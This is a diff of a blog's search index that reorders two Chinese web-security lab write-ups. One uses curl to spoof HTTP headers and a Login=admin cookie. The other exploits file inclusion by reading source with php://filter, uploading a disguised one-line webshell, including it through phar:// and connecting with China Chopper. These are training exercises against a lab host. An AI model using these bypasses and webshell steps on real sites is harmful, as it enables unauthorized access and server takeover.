@@ -1,128 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>实验_web安全之HTTP头部字段理解</title>
-    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/</url>
-    <content><![CDATA[<p>本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。</p>
-<a id="more"></a>
-
-<h2><span id="第一题-观察http-响应头">第一题 观察HTTP 响应头</span></h2><p>题目提示观察http响应头所以只观察响应头即可。通过命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/1.php</span><br></pre></td></tr></table></figure>
-
-<p>得到:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: hello world!</span><br></pre></td></tr></table></figure>
-
-<h2><span id="第二题-referer理解">第二题 Referer理解</span></h2><p>提示必须从<a href="http://www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段" target="_blank" rel="noopener">www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段</a></p>
-<p>通过命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php</span><br></pre></td></tr></table></figure>
-
-<p>从响应中获取key:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
-
-<h2><span id="第三题-x-forwarded-for理解">第三题 X-Forwarded-For理解</span></h2><p>通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 <a href="http://www.hetianlab.com/" target="_blank" rel="noopener">http://www.hetianlab.com/</a> 。先curl下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
-
-<p>得到：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">this page only accept come from localhost</span><br></pre></td></tr></table></figure>
-
-<p>本地才能访问，所以伪造X-Forwarded-For为127.0.0.1</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
-
-<p>得到key</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
-
-<h2><span id="第四题-user-agent理解">第四题 User-Agent理解</span></h2><p>题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php</span><br></pre></td></tr></table></figure>
-
-<p>得到key:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
-
-<p>第五题 Accept-Language理解</p>
-<p>题目提示只允许外国人登录,猜测接收语言为英语即可。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php</span><br></pre></td></tr></table></figure>
-
-<h2><span id="第六题-cookie理解">第六题 Cookie理解</span></h2><p>题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
-
-<p>发现响应头中会设置cookie:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set-Cookie: Login=anonymous</span><br></pre></td></tr></table></figure>
-
-<p>所以请求时将cookie设置为Login=admin即可。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>http</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>实验-文件包含漏洞</title>
-    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。</p>
-<a id="more"></a>
-
-<h2><span id="本地文件包含">本地文件包含</span></h2><p>（1）提示include.php，访问include.php</p>
-<p>（2）提示参数为file.利用file=include.php发现文件包含生效。</p>
-<p>（3）尝试读取源代码</p>
-<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=<span class="built_in">include</span>.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/assets/image-20200421212856583-1588308709161.png" alt="image-20200421212856583"></p>
-<p>base64解码后：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Tips: the parameter is file! :) </span><br><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    @$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>可以看到有后名单机制，包括http,data,ftp,input，而且是大小写不敏感。</p>
-<p>（4）注意到注释中有upload.php。访问upload.php。发现可以文件上传（这里也可以用fuzz来找到upload.php）。</p>
-<p>上传一个一句话木马post.php。发现上传失败</p>
-<p>因为有文件包含漏洞，所以只要不是文件内容检测都能绕过，将post.php改为post.png.</p>
-<p>上传成功：</p>
-<p><img src="/assets/image-20200421225912301-1588308709163.png" alt="image-20200421225912301"></p>
-<p>接下来进行文件包含。</p>
-<p> <a href="http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png" target="_blank" rel="noopener">http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png</a> </p>
-<p>利用菜刀连接即可。</p>
-<p><img src="/assets/image-20200421230943902-1588308709163.png" alt="image-20200421230943902"></p>
-<h2><span id="远程文件包含">远程文件包含</span></h2><p>（1）参数有file,提示php文件。代表只输入文件名就可以。</p>
-<p>猜测代码：</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>].<span class="string">"php"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
-
-<p>（2）读源码</p>
-<p>file=php://filter/convert.base64-encode/resource=include</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Tips:  </span><br><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    @$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($file.<span class="string">'.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>题目要求phar，现在上传一个zip文件。</p>
-<p><img src="/assets/image-20200421231446262-1588308709163.png" alt="image-20200421231446262"></p>
-<p>发现不能上传zip。抓包看下是基于什么机制过滤的。</p>
-<p>发现Mime类型不行。加点大小写什么的都不行。文件上传这个点做的比较严格。但是因为有文件包含漏洞，所以我的zip后缀改为任意的都行，比如改为jpg</p>
-<p><img src="/assets/image-20200421232107205-1588308709164.png" alt="image-20200421232107205"></p>
-<p>然后利用phar协议访问zip中的post.php</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//u</span>pload<span class="regexp">/webshell.jpg/</span>post.php</span><br></pre></td></tr></table></figure>
-
-<p>用菜刀连接尝试,发现连接失败。</p>
-<p>看了下路径不对，第二道题和第一道题不是在同一个路径下，改一下路径：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//</span>..<span class="regexp">/1/u</span>pload<span class="regexp">/webshell.jpg/</span>post.php</span><br></pre></td></tr></table></figure>
-
-<p>发现报错error。</p>
-<p>再想一下，不仅忘记去掉后缀名php了，而且不支持..</p>
-<p>尝试使用绝对路径</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/include/</span><span class="number">1</span><span class="regexp">/upload/</span>webshell.jpg<span class="regexp">/post</span></span><br></pre></td></tr></table></figure>
-
-<p>菜刀连接，成功连接</p>
-<p><img src="/assets/image-20200421233702677-1588308709164.png" alt="image-20200421233702677"></p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>合天培训_实验_sql注入</title>
     <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>本文主要描述了SQL注入的几种类型，以及使用sqlmap如何对这几种类型进行注入。</p>
@@ -287,6 +165,128 @@
       <tags>
         <tag>web</tag>
         <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>实验_web安全之HTTP头部字段理解</title>
+    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/</url>
+    <content><![CDATA[<p>本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。</p>
+<a id="more"></a>
+
+<h2><span id="第一题-观察http-响应头">第一题 观察HTTP 响应头</span></h2><p>题目提示观察http响应头所以只观察响应头即可。通过命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/1.php</span><br></pre></td></tr></table></figure>
+
+<p>得到:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: hello world!</span><br></pre></td></tr></table></figure>
+
+<h2><span id="第二题-referer理解">第二题 Referer理解</span></h2><p>提示必须从<a href="http://www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段" target="_blank" rel="noopener">www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段</a></p>
+<p>通过命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php</span><br></pre></td></tr></table></figure>
+
+<p>从响应中获取key:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
+
+<h2><span id="第三题-x-forwarded-for理解">第三题 X-Forwarded-For理解</span></h2><p>通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 <a href="http://www.hetianlab.com/" target="_blank" rel="noopener">http://www.hetianlab.com/</a> 。先curl下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">this page only accept come from localhost</span><br></pre></td></tr></table></figure>
+
+<p>本地才能访问，所以伪造X-Forwarded-For为127.0.0.1</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
+
+<p>得到key</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
+
+<h2><span id="第四题-user-agent理解">第四题 User-Agent理解</span></h2><p>题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php</span><br></pre></td></tr></table></figure>
+
+<p>得到key:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
+
+<p>第五题 Accept-Language理解</p>
+<p>题目提示只允许外国人登录,猜测接收语言为英语即可。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php</span><br></pre></td></tr></table></figure>
+
+<h2><span id="第六题-cookie理解">第六题 Cookie理解</span></h2><p>题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
+
+<p>发现响应头中会设置cookie:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set-Cookie: Login=anonymous</span><br></pre></td></tr></table></figure>
+
+<p>所以请求时将cookie设置为Login=admin即可。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>http</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>实验-文件包含漏洞</title>
+    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。</p>
+<a id="more"></a>
+
+<h2><span id="本地文件包含">本地文件包含</span></h2><p>（1）提示include.php，访问include.php</p>
+<p>（2）提示参数为file.利用file=include.php发现文件包含生效。</p>
+<p>（3）尝试读取源代码</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=<span class="built_in">include</span>.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200421212856583-1588308709161.png" alt="image-20200421212856583"></p>
+<p>base64解码后：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Tips: the parameter is file! :) </span><br><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    @$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到有后名单机制，包括http,data,ftp,input，而且是大小写不敏感。</p>
+<p>（4）注意到注释中有upload.php。访问upload.php。发现可以文件上传（这里也可以用fuzz来找到upload.php）。</p>
+<p>上传一个一句话木马post.php。发现上传失败</p>
+<p>因为有文件包含漏洞，所以只要不是文件内容检测都能绕过，将post.php改为post.png.</p>
+<p>上传成功：</p>
+<p><img src="/assets/image-20200421225912301-1588308709163.png" alt="image-20200421225912301"></p>
+<p>接下来进行文件包含。</p>
+<p> <a href="http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png" target="_blank" rel="noopener">http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png</a> </p>
+<p>利用菜刀连接即可。</p>
+<p><img src="/assets/image-20200421230943902-1588308709163.png" alt="image-20200421230943902"></p>
+<h2><span id="远程文件包含">远程文件包含</span></h2><p>（1）参数有file,提示php文件。代表只输入文件名就可以。</p>
+<p>猜测代码：</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>].<span class="string">"php"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+<p>（2）读源码</p>
+<p>file=php://filter/convert.base64-encode/resource=include</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Tips:  </span><br><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    @$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($file.<span class="string">'.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>题目要求phar，现在上传一个zip文件。</p>
+<p><img src="/assets/image-20200421231446262-1588308709163.png" alt="image-20200421231446262"></p>
+<p>发现不能上传zip。抓包看下是基于什么机制过滤的。</p>
+<p>发现Mime类型不行。加点大小写什么的都不行。文件上传这个点做的比较严格。但是因为有文件包含漏洞，所以我的zip后缀改为任意的都行，比如改为jpg</p>
+<p><img src="/assets/image-20200421232107205-1588308709164.png" alt="image-20200421232107205"></p>
+<p>然后利用phar协议访问zip中的post.php</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//u</span>pload<span class="regexp">/webshell.jpg/</span>post.php</span><br></pre></td></tr></table></figure>
+
+<p>用菜刀连接尝试,发现连接失败。</p>
+<p>看了下路径不对，第二道题和第一道题不是在同一个路径下，改一下路径：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//</span>..<span class="regexp">/1/u</span>pload<span class="regexp">/webshell.jpg/</span>post.php</span><br></pre></td></tr></table></figure>
+
+<p>发现报错error。</p>
+<p>再想一下，不仅忘记去掉后缀名php了，而且不支持..</p>
+<p>尝试使用绝对路径</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/include/</span><span class="number">1</span><span class="regexp">/upload/</span>webshell.jpg<span class="regexp">/post</span></span><br></pre></td></tr></table></figure>
+
+<p>菜刀连接，成功连接</p>
+<p><img src="/assets/image-20200421233702677-1588308709164.png" alt="image-20200421233702677"></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
